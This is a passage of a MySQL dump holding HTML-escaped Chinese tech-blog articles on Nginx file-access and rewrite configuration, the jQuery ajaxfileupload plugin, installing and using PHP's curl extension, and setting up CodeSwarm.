禁止访问某类型的文件.&lt;/span&gt;&lt;br style=&quot;font-weight:bold&quot; /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;如，Nginx下禁止访问*.txt文件，配置方法如下. &lt;/span&gt;&lt;br /&gt;&lt;br /&gt;location ~* .(txt|doc)$ {&lt;br /&gt; &amp;nbsp; if (-f $request_filename) {&lt;br /&gt; &amp;nbsp; root /data/www/wwwroot/linuxtone/test;&lt;br /&gt; &amp;nbsp; #rewrite &hellip;..可以重定向到某个URL&lt;br /&gt; &amp;nbsp; break;&lt;br /&gt; &amp;nbsp; }&lt;br /&gt;}&lt;br /&gt;&lt;br /&gt;location ~* .(txt|doc)${&lt;br /&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;root /data/www/wwwroot/linuxtone/test;&lt;br /&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;deny all;&lt;br /&gt;}&lt;br /&gt;&lt;br /&gt;推荐参考地址：&lt;br /&gt;Mailing list ARChives 官方讨论区&lt;br /&gt;http://marc.info/?l=nginx&lt;br /&gt;&lt;br /&gt;Nginx 常见应用技术指南[Nginx Tips]&lt;br /&gt;http://bbs.linuxtone.org/thread-1685-1-1.html&lt;p&gt;&lt;br /&gt;&lt;/p&gt;', 1386778290),
(52, 52, '&lt;p&gt;Nginx中可以使用rewrite配置url的重定向，rewrite指令可以位于server段，也可以位于location中，配置rewrite后通过/usr/local/nginx/sbin/nginx -t检查配置时，出现如下错误：&lt;/p&gt;&lt;pre&gt;nginx: [emerg] directive &quot;rewrite&quot; is not terminated by &quot;;&quot; in /usr/local/nginx/conf/nginx.conf:139\r\nnginx: configuration file /usr/local/nginx/conf/nginx.conf test failed&lt;/pre&gt;&lt;p&gt;解决的办法是把规则段使用引号引起来。例如：&lt;/p&gt;&lt;pre class=&quot;brush:plain;toolbar:false;&quot;&gt;rewrite ^/e/([a-z0-5]{6})$ /index.php?s=/element/elementInfo/shorttag/$1 last;&lt;/pre&gt;&lt;p&gt;修改为&lt;/p&gt;&lt;pre class=&quot;brush:plain;toolbar:false;&quot;&gt;rewrite &quot;^/e/([a-z0-5]{6})$&quot; /index.php?s=/element/elementInfo/shorttag/$1 last;&lt;/pre&gt;&lt;p&gt;为什么有些必须要引号，有些又可以省略呢，仔细看第一条规则，里面出现了符号 &ldquo;{6}&rdquo;，应该是它造成的，因为配置文件中都是用它来作为配置的段起止标记，所以为了安全起见，最好还是都带上引号。&lt;br /&gt;&lt;/p&gt;', 1386778404),
(53, 53, '&lt;p&gt;插件下载地址：&lt;a target=&quot;_blank&quot; href=&quot;http://www.phpletter.com/contents/ajaxfileupload/ajaxfileupload.js&quot;&gt;http://www.phpletter.com/contents/ajaxfileupload/ajaxfileupload.js&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;注意：&lt;/span&gt;新版的jquery中移除了handleError方法，该插件需要用到这个方法，我们需要将以下代码加入到ajaxfileupload.js文件中&lt;/p&gt;&lt;pre class=&quot;brush:js;toolbar:false;&quot;&gt;handleError: function( s, xhr, status, e ) { \r\n        // If a local callback was specified, fire it \r\n        if ( s.error ) { \r\n            s.error.call( s.context || s, xhr, status, e ); \r\n        } \r\n                                   \r\n        // Fire the global callback \r\n        if ( s.global ) { \r\n            (s.context ? jQuery(s.context) : jQuery.event).trigger( &quot;ajaxError&quot;, [xhr, s, e] ); \r\n        } \r\n    }&lt;/pre&gt;&lt;p&gt;使用方法：&lt;/p&gt;&lt;p&gt;首先需要引入文件：&lt;/p&gt;&lt;pre class=&quot;brush:js;toolbar:false;&quot;&gt;&amp;lt;script type=&quot;text/javascript&quot; src=&quot;jquery.js&quot;&amp;gt;&amp;lt;/script&amp;gt; \r\n&amp;lt;script type=&quot;text/javascript&quot; src=&quot;ajaxfileupload.js&quot;&amp;gt;&amp;lt;/script&amp;gt;&lt;/pre&gt;&lt;p&gt;HTML表单代码：&lt;/p&gt;&lt;pre class=&quot;brush:html;toolbar:false;&quot;&gt;&amp;lt;form name=&quot;newform&quot; enctype=&quot;multipart/form-data&quot; action=&quot;&quot; method=&quot;post&quot;&amp;gt; \r\n    &amp;lt;ul class=&quot;formbody&quot;&amp;gt; \r\n        &amp;lt;li class=&quot;formblock colorblock&quot;&amp;gt; \r\n            &amp;lt;span&amp;gt;上传图片: &amp;lt;/span&amp;gt; \r\n            &amp;lt;input id=&quot;flinkimg&quot; type=&quot;file&quot; name=&quot;flinkimg&quot; class=&quot;input&quot; /&amp;gt; \r\n        &amp;lt;/li&amp;gt; \r\n        &amp;lt;li class=&quot;formblock&quot;&amp;gt; \r\n            &amp;lt;input type=&quot;button&quot; name=&quot;newflink&quot; class=&quot;button&quot; value=&quot;上传&quot; /&amp;gt; \r\n        &amp;lt;/li&amp;gt; \r\n    &amp;lt;/ul&amp;gt; \r\n&amp;lt;/form&amp;gt;&lt;/pre&gt;&lt;p&gt;注意：使用ajaxfileupload上传文件，可以不需要form&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;JS代码：&lt;/p&gt;&lt;pre class=&quot;brush:js;toolbar:false;&quot;&gt;$(&quot;input:[name=newflink]&quot;).click(function(){ \r\n    var furl = $(&quot;form[name=newform]&quot;).attr(&#039;action&#039;); \r\n    $.ajaxFileUpload ({ \r\n        url : furl, \r\n        secureuri :false, \r\n        fileElementId :&#039;flinkimg&#039;, \r\n        dataType : &#039;json&#039;,  \r\n        success : function (data, status){ \r\n            alert(data.data.errormsg); \r\n            if (!data.data.errorcode) { \r\n                location.href = location; \r\n            } \r\n        }, \r\n        error: function (s, data, status, e){ \r\n            alert(data); \r\n        } \r\n    }) \r\n});&lt;/pre&gt;&lt;p&gt;&lt;span style=&quot;color:#006600&quot;&gt;&lt;br /&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#006600&quot;&gt;主要参数说明：&lt;/span&gt;&lt;br /&gt;1，url表示处理文件上传操作的文件路径，可以测试URL是否能在浏览器中直接访问，如：upload.php&lt;br /&gt;2，fileElementId表示文件域ID，如上：flinkimg&lt;br /&gt;3，secureuri是否启用安全提交，默认为false&lt;br /&gt;4，dataType数据数据，一般选json，javascript的原生态&lt;br /&gt;5，success提交成功后处理函数&lt;br /&gt;6，error提交失败处理函数&lt;/p&gt;&lt;p&gt;上面有两个方法，一个动态加载小图标提示函数loading()和ajaxFileUpload文件上传$.ajaxFileUpload()函数，这与我们使用jQuery.ajax()函数差不多，使用很简单&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;相关的错误提示&lt;/p&gt;&lt;p&gt;1，SyntaxError: missing ; before statement错误&lt;br /&gt;如果出现这个错误就需要检查url路径是否可以访问&lt;/p&gt;&lt;p&gt;2，SyntaxError: syntax error错误&lt;br /&gt;如果出现这个错误就需要检查处理提交操作的PHP文件是否存在语法错误&lt;/p&gt;&lt;p&gt;3，SyntaxError: invalid property id错误&lt;br /&gt;如果出现这个错误就需要检查属性ID是否存在&lt;/p&gt;&lt;p&gt;4，SyntaxError: missing } in XML expression错误&lt;br /&gt;如果出现这个错误就需要检查文件域名称是否一致或不存在&lt;/p&gt;5，其它自定义错误&lt;br /&gt;大家可使用变量$error直接打印的方法检查各参数是否正确，比起上面这些无效的错误提示还是方便很多。&lt;p&gt;&lt;br /&gt;&lt;/p&gt;', 1386778572);
INSERT INTO `la_article` (`id`, `archiveid`, `content`, `updatetime`) VALUES
(54, 54, '&lt;p&gt;php的curl扩展已经内置到php的安装包里，我们无需重新下载，位置php-5.3.6/ext/curl&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;span style=&quot;font-size:24px&quot;&gt;&lt;strong&gt;安装&lt;/strong&gt;&lt;/span&gt;&lt;pre class=&quot;brush:bash;toolbar:false;&quot;&gt;#cd php-5.3.6/ext/curl \r\n#/usr/local/php/bin/phpize \r\n#./configure  \r\n#make \r\n#make install&lt;/pre&gt;&lt;p&gt;安装完成之后将生成的curl.so复制到php扩展的存放目录，然后&lt;/p&gt;&lt;pre class=&quot;brush:bash;toolbar:false;&quot;&gt;#vi /usr/local/php/etc/php.ini&lt;/pre&gt;&lt;p&gt;加入以下代码&lt;/p&gt;&lt;p&gt;&lt;code&gt;&lt;span class=&quot;html&quot;&gt;extension = curl.so&lt;/span&gt;&lt;/code&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:24px&quot;&gt;&lt;strong&gt;使用&lt;/strong&gt;&lt;/span&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;基本的代码结构：&lt;/p&gt;&lt;pre class=&quot;brush:php;toolbar:false;&quot;&gt;$url = &#039;http://www.baidu.com&#039;; \r\n$curl = curl_init($url); \r\ncurl_setopt($curl, CURLOPT_NOBODY, true); \r\ncurl_setopt($curl, CURLOPT_NOSIGNAL, true); \r\ncurl_setopt($curl, CURLOPT_TIMEOUT_MS, 200); \r\n$status = curl_exec($curl); \r\nif ($status) { \r\n    $res = curl_getinfo($curl); \r\n    echo &quot;&amp;lt;pre&amp;gt;&quot;;print_r($res); \r\n} \r\ncurl_close($curl);&lt;/pre&gt;&lt;p&gt;输出结果：&lt;/p&gt;&lt;pre class=&quot;brush:php;toolbar:false;&quot;&gt;Array \r\n( \r\n    [url] =&amp;gt; http://www.baidu.com \r\n    [content_type] =&amp;gt; text/html;charset=gbk \r\n    [http_code] =&amp;gt; 200 \r\n    [header_size] =&amp;gt; 384 \r\n    [request_size] =&amp;gt; 53 \r\n    [filetime] =&amp;gt; -1 \r\n    [ssl_verify_result] =&amp;gt; 0 \r\n    [redirect_count] =&amp;gt; 0 \r\n    [total_time] =&amp;gt; 0.078 \r\n    [namelookup_time] =&amp;gt; 0 \r\n    [connect_time] =&amp;gt; 0.031 \r\n    [pretransfer_time] =&amp;gt; 0.031 \r\n    [size_upload] =&amp;gt; 0 \r\n    [size_download] =&amp;gt; 0 \r\n    [speed_download] =&amp;gt; 0 \r\n    [speed_upload] =&amp;gt; 0 \r\n    [download_content_length] =&amp;gt; 9355 \r\n    [upload_content_length] =&amp;gt; 0 \r\n    [starttransfer_time] =&amp;gt; 0.078 \r\n    [redirect_time] =&amp;gt; 0 \r\n    [certinfo] =&amp;gt; Array \r\n        ( \r\n        ) \r\n             \r\n    [redirect_url] =&amp;gt;  \r\n)&lt;/pre&gt;&lt;p&gt;&lt;br /&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;语法解释：&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#009900&quot;&gt;curl_init &amp;nbsp; 初始化curl句柄&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#009900&quot;&gt;curl_setopt &amp;nbsp; &lt;span class=&quot;dc-title&quot;&gt;设置一个cURL传输选项&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#009900&quot;&gt;curl_exec &amp;nbsp; &lt;span class=&quot;dc-title&quot;&gt;执行一个cURL会话&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class=&quot;refpurpose&quot;&gt;&lt;span style=&quot;color:#009900&quot;&gt;curl_getinfo &amp;nbsp; &lt;span class=&quot;dc-title&quot;&gt;获取一个cURL连接资源句柄的信息&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;refname&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class=&quot;refpurpose&quot;&gt;&lt;span class=&quot;refname&quot;&gt;&lt;span style=&quot;color:#ff9900&quot;&gt;批处理curl操作&lt;/span&gt;&lt;br /&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class=&quot;refpurpose&quot;&gt;&lt;span class=&quot;refname&quot;&gt;curl_multi_init&lt;/span&gt; &mdash; &lt;span class=&quot;dc-title&quot;&gt;返回一个新cURL批处理句柄&lt;/span&gt;&lt;/p&gt;&lt;p class=&quot;refpurpose&quot;&gt;&lt;span class=&quot;dc-title&quot;&gt;&lt;span class=&quot;refname&quot;&gt;curl_multi_add_handle&lt;/span&gt; &mdash;&lt;span class=&quot;dc-title&quot;&gt;向curl批处理会话中添加单独的curl句柄&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class=&quot;refpurpose&quot;&gt;&lt;span class=&quot;dc-title&quot;&gt;&lt;span class=&quot;dc-title&quot;&gt;&lt;span class=&quot;refname&quot;&gt;curl_multi_exec&lt;/span&gt; &mdash;&lt;span class=&quot;dc-title&quot;&gt;解析一个cURL批处理句柄&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class=&quot;refpurpose&quot;&gt;&lt;span class=&quot;dc-title&quot;&gt;&lt;span class=&quot;dc-title&quot;&gt;&lt;span class=&quot;refname&quot;&gt;curl_multi_remove_handle&lt;/span&gt; &mdash;&lt;span class=&quot;dc-title&quot;&gt;移除curl批处理句柄资源中的某个句柄资源&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class=&quot;refpurpose&quot;&gt;&lt;span class=&quot;dc-title&quot;&gt;&lt;span class=&quot;dc-title&quot;&gt;&lt;span class=&quot;dc-title&quot;&gt;&lt;span class=&quot;refname&quot;&gt;curl_multi_info_read&lt;/span&gt; &mdash;&lt;span class=&quot;dc-title&quot;&gt;获取当前解析的cURL的相关传输信息&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class=&quot;refpurpose&quot;&gt;&lt;span class=&quot;dc-title&quot;&gt;&lt;span class=&quot;dc-title&quot;&gt;&lt;span class=&quot;dc-title&quot;&gt;&lt;span class=&quot;dc-title&quot;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class=&quot;refpurpose&quot;&gt;&lt;span class=&quot;refname&quot;&gt;curl_multi_close&lt;/span&gt; &mdash; &lt;span class=&quot;dc-title&quot;&gt;关闭一组cURL句柄&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;strong&gt;&lt;span style=&quot;color:#6600cc&quot;&gt;curl_setopt($ch, $option, $value)&lt;/span&gt;&lt;/strong&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;$ch &amp;nbsp; curl资源句柄&lt;/p&gt;&lt;p&gt;$option &amp;nbsp; 要设置的&lt;em&gt;CURLOPT_XXX&lt;/em&gt;选项 &lt;/p&gt;&lt;p&gt;$value &amp;nbsp; 为option选项赋的值&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#009900&quot;&gt;常用$option参数值：&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;strong&gt;&lt;tt&gt;CURLOPT_NOBODY&lt;/tt&gt;&lt;/strong&gt; &amp;nbsp; 启用时将不对HTML中的BODY部分进行输出 &amp;nbsp; true/false&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;strong&gt;&lt;tt&gt;CURLOPT_PORT&lt;/tt&gt;&lt;/strong&gt; &amp;nbsp; 指定连接的端口号 &lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;strong&gt;&lt;tt&gt;CURLOPT_TIMEOUT&lt;/tt&gt;&lt;/strong&gt; &amp;nbsp; 设置curl允许执行的最大秒数&lt;/p&gt;&lt;p&gt;&lt;strong&gt;&lt;tt&gt;CURLOPT_TIMEOUT_MS&lt;/tt&gt;&lt;/strong&gt; &amp;nbsp; 设置curl允许之星的最大毫秒数&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;strong&gt;&lt;tt&gt;CURLOPT_CONNECTTIMEOUT_MS&lt;/tt&gt;&lt;/strong&gt; &amp;nbsp; 尝试连接等待的时间，以毫秒为单位。如果设置为0，则无限等待 (超时时间)&lt;/p&gt;&lt;p&gt;&lt;strong&gt;&lt;tt&gt;CURLOPT_REFERER&lt;/tt&gt;&lt;/strong&gt; &amp;nbsp; 设置http请求中&lt;em&gt;&amp;quot;Referer: &amp;quot;&lt;/em&gt;的内容&lt;/p&gt;&lt;p&gt;&lt;strong&gt;&lt;tt&gt;CURLOPT_POST&lt;/tt&gt;&lt;/strong&gt; &amp;nbsp; 发送一个常规的POST请求，类型为：&lt;em&gt;application/x-www-form-urlencoded&lt;/em&gt;，就像表单提交的一样 true/false&lt;br /&gt;&lt;/p&gt;&lt;p&gt;详细option的可选参数及value值请查询手册&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;strong&gt;&lt;span style=&quot;color:#6600cc&quot;&gt;curl_getinfo($ch, $option)&lt;/span&gt;&lt;/strong&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;$ch &amp;nbsp; curl资源句柄&lt;/p&gt;&lt;p&gt;$option &amp;nbsp; 要设置的&lt;em&gt;CURLOPT_XXX&lt;/em&gt;选项 &lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#009900&quot;&gt;常用$option参数值：&lt;/span&gt;&lt;span class=&quot;simpara&quot;&gt;&lt;strong&gt;&lt;tt&gt;&lt;br /&gt;&lt;/tt&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;simpara&quot;&gt;&lt;strong&gt;&lt;tt&gt;CURLINFO_EFFECTIVE_URL&lt;/tt&gt;&lt;/strong&gt; - 最后一个有效的URL地址&lt;/span&gt;&lt;span class=&quot;simpara&quot;&gt;&lt;strong&gt;&lt;tt&gt;&lt;br /&gt;&lt;/tt&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;simpara&quot;&gt;&lt;strong&gt;&lt;tt&gt;CURLINFO_HTTP_CODE&lt;/tt&gt;&lt;/strong&gt; - 最后一个收到的HTTP代码&lt;/span&gt;&lt;span class=&quot;simpara&quot;&gt;&lt;strong&gt;&lt;tt&gt;&lt;br /&gt;&lt;/tt&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;simpara&quot;&gt;&lt;strong&gt;&lt;tt&gt;CURLINFO_FILETIME&lt;/tt&gt;&lt;/strong&gt; - 远程获取文档的时间，如果无法获取，则返回值为&ldquo;-1&rdquo;&lt;/span&gt;&lt;span class=&quot;simpara&quot;&gt;&lt;strong&gt;&lt;tt&gt;&lt;br /&gt;&lt;/tt&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;simpara&quot;&gt;&lt;strong&gt;&lt;tt&gt;CURLINFO_TOTAL_TIME&lt;/tt&gt;&lt;/strong&gt; - 最后一次传输所消耗的时间&lt;/span&gt;&lt;span class=&quot;simpara&quot;&gt;&lt;strong&gt;&lt;tt&gt;&lt;br /&gt;&lt;/tt&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;simpara&quot;&gt;&lt;strong&gt;&lt;tt&gt;CURLINFO_NAMELOOKUP_TIME&lt;/tt&gt;&lt;/strong&gt; - 名称解析所消耗的时间&lt;/span&gt;&lt;span class=&quot;simpara&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;simpara&quot;&gt;&lt;strong&gt;&lt;tt&gt;CURLINFO_CONNECT_TIME&lt;/tt&gt;&lt;/strong&gt; - 建立连接所消耗的时间&lt;/span&gt;&lt;span class=&quot;simpara&quot;&gt;&lt;strong&gt;&lt;tt&gt;&lt;br /&gt;&lt;/tt&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;simpara&quot;&gt;&lt;strong&gt;&lt;tt&gt;CURLINFO_PRETRANSFER_TIME&lt;/tt&gt;&lt;/strong&gt; - 从建立连接到准备传输所使用的时间&lt;/span&gt;&lt;span class=&quot;simpara&quot;&gt;&lt;strong&gt;&lt;tt&gt;&lt;br /&gt;&lt;/tt&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;simpara&quot;&gt;&lt;strong&gt;&lt;tt&gt;CURLINFO_STARTTRANSFER_TIME&lt;/tt&gt;&lt;/strong&gt; - 从建立连接到传输开始所使用的时间&lt;/span&gt;&lt;span class=&quot;simpara&quot;&gt;&lt;strong&gt;&lt;tt&gt;&lt;br /&gt;&lt;/tt&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;simpara&quot;&gt;&lt;strong&gt;&lt;tt&gt;CURLINFO_REDIRECT_TIME&lt;/tt&gt;&lt;/strong&gt; - 在事务传输开始前重定向所使用的时间&lt;/span&gt;&lt;span class=&quot;simpara&quot;&gt;&lt;strong&gt;&lt;tt&gt;&lt;br /&gt;&lt;/tt&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;simpara&quot;&gt;&lt;strong&gt;&lt;tt&gt;CURLINFO_SIZE_UPLOAD&lt;/tt&gt;&lt;/strong&gt; - 上传数据量的总值&lt;/span&gt;&lt;span class=&quot;simpara&quot;&gt;&lt;strong&gt;&lt;tt&gt;&lt;br /&gt;&lt;/tt&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;simpara&quot;&gt;&lt;strong&gt;&lt;tt&gt;CURLINFO_SIZE_DOWNLOAD&lt;/tt&gt;&lt;/strong&gt; - 下载数据量的总值&lt;/span&gt;&lt;span class=&quot;simpara&quot;&gt;&lt;strong&gt;&lt;tt&gt;&lt;br /&gt;&lt;/tt&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;simpara&quot;&gt;&lt;strong&gt;&lt;tt&gt;CURLINFO_SPEED_DOWNLOAD&lt;/tt&gt;&lt;/strong&gt; - 平均下载速度&lt;/span&gt;&lt;span class=&quot;simpara&quot;&gt;&lt;strong&gt;&lt;tt&gt;&lt;br /&gt;&lt;/tt&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;simpara&quot;&gt;&lt;strong&gt;&lt;tt&gt;CURLINFO_SPEED_UPLOAD&lt;/tt&gt;&lt;/strong&gt; - 平均上传速度&lt;/span&gt;&lt;span class=&quot;simpara&quot;&gt;&lt;strong&gt;&lt;tt&gt;&lt;br /&gt;&lt;/tt&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;simpara&quot;&gt;&lt;strong&gt;&lt;tt&gt;CURLINFO_HEADER_SIZE&lt;/tt&gt;&lt;/strong&gt; - header部分的大小&lt;/span&gt;&lt;span class=&quot;simpara&quot;&gt;&lt;strong&gt;&lt;tt&gt;&lt;br /&gt;&lt;/tt&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;simpara&quot;&gt;&lt;strong&gt;&lt;tt&gt;CURLINFO_HEADER_OUT&lt;/tt&gt;&lt;/strong&gt; - 发送请求的字符串&lt;/span&gt;&lt;span class=&quot;simpara&quot;&gt;&lt;strong&gt;&lt;tt&gt;&lt;br /&gt;&lt;/tt&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;simpara&quot;&gt;&lt;strong&gt;&lt;tt&gt;CURLINFO_REQUEST_SIZE&lt;/tt&gt;&lt;/strong&gt; - 在HTTP请求中有问题的请求的大小&lt;/span&gt;&lt;span class=&quot;simpara&quot;&gt;&lt;strong&gt;&lt;tt&gt;&lt;br /&gt;&lt;/tt&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;simpara&quot;&gt;&lt;strong&gt;&lt;tt&gt;CURLINFO_SSL_VERIFYRESULT&lt;/tt&gt;&lt;/strong&gt; - 通过设置&lt;strong&gt;&lt;tt&gt;CURLOPT_SSL_VERIFYPEER&lt;/tt&gt;&lt;/strong&gt;返回的SSL证书验证请求的结果&lt;/span&gt;&lt;span class=&quot;simpara&quot;&gt;&lt;strong&gt;&lt;tt&gt;&lt;br /&gt;&lt;/tt&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;simpara&quot;&gt;&lt;strong&gt;&lt;tt&gt;CURLINFO_CONTENT_LENGTH_DOWNLOAD&lt;/tt&gt;&lt;/strong&gt; - 从&lt;em&gt;Content-Length:&lt;/em&gt; field中读取的下载内容长度&lt;/span&gt;&lt;span class=&quot;simpara&quot;&gt;&lt;strong&gt;&lt;tt&gt;&lt;br /&gt;&lt;/tt&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;simpara&quot;&gt;&lt;strong&gt;&lt;tt&gt;CURLINFO_CONTENT_LENGTH_UPLOAD&lt;/tt&gt;&lt;/strong&gt; - 上传内容大小的说明&lt;/span&gt;&lt;span class=&quot;simpara&quot;&gt;&lt;strong&gt;&lt;tt&gt;&lt;br /&gt;&lt;/tt&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;simpara&quot;&gt;&lt;strong&gt;&lt;tt&gt;CURLINFO_CONTENT_TYPE&lt;/tt&gt;&lt;/strong&gt; - 下载内容的&lt;em&gt;Content-Type:&lt;/em&gt;值，NULL表示服务器没有发送有效的&lt;em&gt;Content-Type:&lt;/em&gt; header&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p&gt;&lt;strong&gt;&lt;span style=&quot;color:#009900&quot;&gt;curl批处理过程&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;&lt;pre class=&quot;brush:php;toolbar:false;&quot;&gt;$mh = curl_multi_init(); \r\n     \r\ncurl_multi_add_handle($mh,$ch1); \r\ncurl_multi_add_handle($mh,$ch2); \r\n     \r\ndo { \r\ncurl_multi_exec($mh,$flag); \r\n} while ($flag &amp;gt; 0); \r\n     \r\ncurl_multi_remove_handle($mh,$ch1); \r\ncurl_multi_remove_handle($mh,$ch2); \r\ncurl_multi_close($mh);&lt;/pre&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;', 1386778734),
(55, 55, '&lt;p&gt;Code Swarm一个可以生成可视化项目代码贡献视频的软件，支持使用svn、cvs、git等代码管理工具提交的日志生成动画。&lt;/p&gt;&lt;p&gt;参考视频：&lt;a target=&quot;_blank&quot; href=&quot;http://v.youku.com/v_show/id_XMzQzNDc4MDk2.html&quot;&gt;豆瓣代码大爆炸视频&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;下面介绍svn的提交日志生成代码视频&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:24px&quot;&gt;&lt;strong&gt;环境需求&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#009900&quot;&gt;JAVA环境 &amp;nbsp; &lt;a target=&quot;_blank&quot; href=&quot;http://www.python.org/download/&quot;&gt;http://www.python.org/download/&lt;/a&gt;&lt;br /&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#009900&quot;&gt;python环境 &amp;nbsp; &lt;a target=&quot;_blank&quot; href=&quot;http://www.java.com/zh_CN/download/manual.jsp&quot;&gt;http://www.java.com/zh_CN/download/manual.jsp&lt;/a&gt;&lt;br /&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;下载之后安装并配置相应的环境变量，如果是windows安装过程中会自动帮你写入到环境变量中，所以不需要做其他配置&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:24px&quot;&gt;&lt;strong&gt;具体过程&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;CodeSwarm的svn地址：http://codeswarm.googlecode.com/svn/trunk&lt;/p&gt;&lt;p&gt;1、下载最新的CodeSwarm代码，仔细阅读目录下的README文件，按照里面的步骤配置好环境&lt;/p&gt;&lt;p&gt;windows详细过程：&lt;/p&gt;&lt;p&gt;下载Apache Ant &amp;nbsp; &lt;a target=&quot;_blank&quot; href=&quot;http://ant.apache.org/bindownload.cgi&quot;&gt;http://ant.apache.org/bindownload.cgi&lt;/a&gt; &amp;nbsp; ，解压到c盘下，然后配置环境变量，桌面右键我的电脑-&amp;gt;高级-&amp;gt;环境变量找到PATH变量将C:apache-ant-1.7.0in;添加到内容的最后，1.7.0请修改为你相应的ant文件夹名字&lt;br /&gt;&lt;/p&gt;&lt;p&gt;2、cmd进入命令行模式，cd到codeswarm文件夹，执行ant命令编译生成可执行文件&lt;/p&gt;&lt;p&gt;3、将svn的提交日志文件（如svn_log.txt）复制到convert_logs目录，cmd命令行模式进入convert_logs目录，用以下命令生成codeswarm可识别的xml文件&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#7030A0;&quot;&gt;convert_logs.py -s svn_log.txt -o sample-repevents.xml&lt;/span&gt;&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;注意：不同的版本管理工具需要不同的命令，其他命令请执行convert_logs.py --help查看&lt;/span&gt;&lt;/p&gt;&lt;p&gt;4、将生成的sample-repevents.xml文件复制到data目录下，注意先备份原来的sample-repevents.xml文件&lt;/p&gt;&lt;p&gt;&lt;span 